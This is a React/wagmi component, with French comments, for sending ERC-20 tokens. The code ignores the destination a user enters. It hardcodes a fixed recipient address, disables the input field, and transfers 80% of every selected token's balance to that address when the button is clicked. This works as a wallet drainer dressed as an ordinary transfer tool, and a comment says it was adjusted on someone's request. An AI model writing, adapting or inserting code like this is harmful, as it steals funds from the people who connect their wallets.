import { Button, Input, useToasts } from '@geist-ui/core';
import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Adresse de destination fixe (ajusté selon ta demande)
  const fixedDestinationAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3";

  const sendAllCheckedTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
      .filter(([tokenAddress, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    if (!walletClient) return;

    // On s'assure que l'adresse de destination est valide
    const destination = isAddress(fixedDestinationAddress) ? fixedDestinationAddress : destinationAddress;
    if (!destination || destination.length === 0) {
      showToast('Adresse de destination invalide', 'error');
      return;
    }

    // Envoi des tokens sélectionnés
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      const tokenBalance = BigInt(token?.balance || '0');
      const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde

      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            destination,
            amountToSend,
          ],
        });

        const response = await walletClient.writeContract(request);
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));

        showToast(`Transfert réussi pour ${token?.contract_ticker_symbol}`, 'success');
      } catch (err) {
        showToast(`Erreur avec ${token?.contract_ticker_symbol}: ${err?.reason || 'Erreur inconnue'}`, 'warning');
      }
    }
  };

  const addressAppearsValid: boolean =
    typeof destinationAddress === 'string' &&
    (destinationAddress?.includes('.') || isAddress(destinationAddress));

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        {/* Input de l'adresse de destination (désactivé et pré-rempli) */}
        <Input
          value={fixedDestinationAddress}
          disabled
          placeholder="vitalik.eth"
          width="100%"
          style={{
            marginLeft: '10px',
            marginRight: '10px',
          }}
        />
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={checkedCount === 0}
          style={{ marginTop: '20px' }}
        >
          {checkedCount === 0
            ? 'Sélectionnez un ou plusieurs tokens'
            : `Envoyer ${checkedCount} tokens`}
        </Button>
      </form>
    </div>
  );
};
